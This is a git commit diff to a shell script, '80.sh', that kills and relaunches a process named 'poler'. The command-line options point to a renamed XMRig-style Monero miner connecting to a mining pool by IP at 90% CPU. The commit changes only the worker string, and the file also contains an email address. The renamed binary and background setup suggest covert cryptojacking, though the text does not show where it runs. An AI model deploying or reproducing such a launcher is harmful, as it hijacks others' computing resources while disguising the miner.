8747ba96cdd073f0259019640d7e2e7b7d48c46e
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-07 02:28:09 +0300

    a4

--- 80.sh
+++ 80.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 109.234.34.187:5909 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass=a4:nikolajzarkov770@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 109.234.34.187:5909 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass=a4-wouf-wouf:nikolajzarkov770@gmail.com -k
